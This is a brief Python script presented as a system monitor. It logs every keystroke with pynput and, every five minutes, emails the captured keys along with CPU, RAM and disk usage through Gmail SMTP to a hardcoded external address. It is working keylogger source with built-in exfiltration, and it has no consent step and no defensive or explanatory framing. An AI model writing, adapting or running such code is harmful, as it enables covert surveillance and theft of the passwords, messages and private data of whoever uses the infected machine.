import psutil
from pynput import keyboard
import smtplib
from email.message import EmailMessage
import time


key_log = []


def on_press(key):
    try:
        key_log.append(key.char)
    except AttributeError:
        key_log.append("[" + str(key) + "]")


listener = keyboard.Listener(on_press=on_press)
listener.start()


your_email = input("Your email: ")
password = input("App password: ")
receiver_email = "virajjayasinha336@gmail.com"


while True:
    time.sleep(300)  

    cpu = psutil.cpu_percent()
    ram = psutil.virtual_memory().percent
    disk = psutil.disk_usage('C:\\').percent

  
    keys = "".join(key_log)
    key_log.clear()  

    data = f"""
SYSTEM DATA

CPU : {cpu} %
RAM : {ram} %
DISK : {disk} %

KEYBOARD LOG:{keys}
"""

  
    msg = EmailMessage()
    msg['Subject'] = "System & Keylog Report"
    msg['From'] = your_email
    msg['To'] = receiver_email
    msg.set_content(data)

    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.login(your_email, password)
    server.send_message(msg)
    server.quit()
